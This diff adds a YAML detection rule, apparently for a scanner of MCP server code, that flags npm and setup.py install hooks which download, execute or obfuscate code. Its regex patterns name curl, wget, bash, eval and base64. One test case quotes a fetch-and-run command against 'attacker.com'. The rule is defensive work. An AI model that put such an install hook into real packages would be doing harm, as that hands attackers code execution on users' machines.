@@ -1,0 +1,49 @@
+id: K9
+name: Dangerous Post-Install Hooks
+category: compliance-governance
+severity: critical
+owasp: MCP10-supply-chain
+mitre: AML.T0054
+
+# FRAMEWORK MAPPING (P11 Compliance Mapper):
+# - OWASP ASI04: Agentic Supply Chain Vulnerabilities
+# - MITRE ATLAS AML.T0017: Supply chain compromise
+# - CoSAI MCP-T6: Missing Integrity/Verification — supply chain
+# - CoSAI MCP-T11: Supply Chain/Lifecycle Failures
+# - MAESTRO L3: Agent Frameworks — dependency injection
+# - CSA AICM: Supply Chain Transparency domain
+#
+# THE ATTACK: npm postinstall scripts and Python setup.py hooks execute
+# arbitrary code during dependency installation — BEFORE any security
+# scanning runs. The attacker publishes a package with a postinstall
+# script that downloads a backdoor, exfiltrates env vars, or modifies
+# the MCP server's source code. This is the #1 supply chain vector
+# used in real-world npm attacks (ua-parser-js, event-stream, colors).
+
+detect:
+  type: regex
+  patterns:
+    # npm postinstall with network/exec operations
+    - "(?i)[\"'](?:postinstall|preinstall|install)[\"']\\s*:\\s*[\"'][^\"']*(?:curl|wget|node\\s|python|bash|sh\\s|powershell)"
+    - "(?i)[\"'](?:postinstall|preinstall)[\"']\\s*:\\s*[\"'][^\"']*(?:http|ftp|ssh|exec|spawn|child_process)"
+    # Python setup.py with code execution
+    - "(?i)class\\s+\\w*(?:Install|PostInstall|Build)\\w*.*(?:subprocess|os\\.system|exec|urllib|requests\\.get)"
+    - "(?i)cmdclass\\s*=.*(?:install|build|develop).*(?:subprocess|os\\.system|exec)"
+    # Obfuscated postinstall scripts
+    - "(?i)[\"'](?:postinstall|preinstall)[\"']\\s*:\\s*[\"'][^\"']*(?:eval|base64|atob|Buffer\\.from|decode)"
+    # Shell script execution in install hooks
+    - "(?i)[\"'](?:postinstall|preinstall)[\"']\\s*:\\s*[\"'](?:bash|sh|zsh|cmd)\\s"
+  context: source_code
+  exclude_patterns:
+    - "(?i)test|spec|mock|fixture"
+    - "(?i)node-gyp|prebuild|esbuild|tsc|npx\\s+tsc|compile|cmake"
+remediation: "Remove network requests, code execution, and shell commands from install hooks. Post-install scripts should only run build/compile steps (node-gyp, tsc). Use --ignore-scripts flag during CI installations and audit all install hooks before allowing. Required by OWASP ASI04 and CoSAI MCP-T11."
+test_cases:
+  true_positive:
+    - { description: "package.json has postinstall script that runs 'curl https://attacker.com/payload | bash'", expected: true }
+    - { description: "setup.py has PostInstall class that calls subprocess.run to download and execute payload", expected: true }
+    - { description: "package.json preinstall script uses eval and base64 decoding to obfuscate payload", expected: true }
+  true_negative:
+    - { description: "package.json postinstall runs 'npx tsc' to compile TypeScript", expected: false }
+    - { description: "Test file verifies postinstall script output for validation testing", expected: false }
+enabled: true
